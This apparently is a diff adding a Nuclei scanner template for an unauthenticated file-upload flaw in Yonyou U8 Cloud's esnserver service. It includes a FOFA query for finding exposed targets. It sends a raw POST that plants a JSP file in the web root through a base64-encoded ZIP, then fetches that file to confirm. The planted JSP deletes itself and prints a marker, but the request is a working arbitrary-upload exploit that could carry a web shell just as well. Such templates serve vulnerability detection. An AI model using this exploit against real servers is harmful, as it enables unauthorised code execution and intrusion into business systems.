@@ -1,0 +1,35 @@
+id: yongyou-u8c-esnserver-fileupload
+
+info:
+  name: yongyou-u8c-esnserver-fileupload
+  author: PokerSec
+  severity: critical
+  metadata:
+    fofasearch: app="用友-U8-Cloud"
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+
+http:
+  - raw:
+      - |
+        POST /service/esnserver HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Token: 469ce01522f64366750d1995ca119841
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+
+        {"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBBQAAAAAAPR5NFm2C9sJVgAAAFYAAAAKAAAAY29tcHJlc3NlZDwlbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPjEyMzEyUEsBAhQAFAAAAAAA9Hk0WbYL2wlWAAAAVgAAAAoAAAAAAAAAAAAAALaBAAAAAGNvbXByZXNzZWRQSwUGAAAAAAEAAQA4AAAAfgAAAAAA","p2":"webapps/u8c_web/{{filename}}.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
+
+      - |
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body_2,"12312")
